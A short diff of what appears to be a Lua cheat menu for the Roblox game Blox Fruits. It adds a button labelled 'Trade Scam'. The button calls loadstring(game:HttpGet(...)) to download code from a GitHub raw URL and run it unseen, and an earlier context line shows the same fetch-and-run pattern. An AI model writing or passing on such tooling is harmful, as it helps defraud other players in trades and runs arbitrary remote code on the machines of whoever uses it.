@@ -26,6 +26,11 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/MozilOnTopp/MozilHub/
 
 end)
 
+Tab:CreateButton("Trade Scam", function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/redeyeytt/bloxfruitscript/refs/heads/main/coolscript",true))()
+
+end)
 
 local Tab = Window:NewSection("Server[📊]")
 
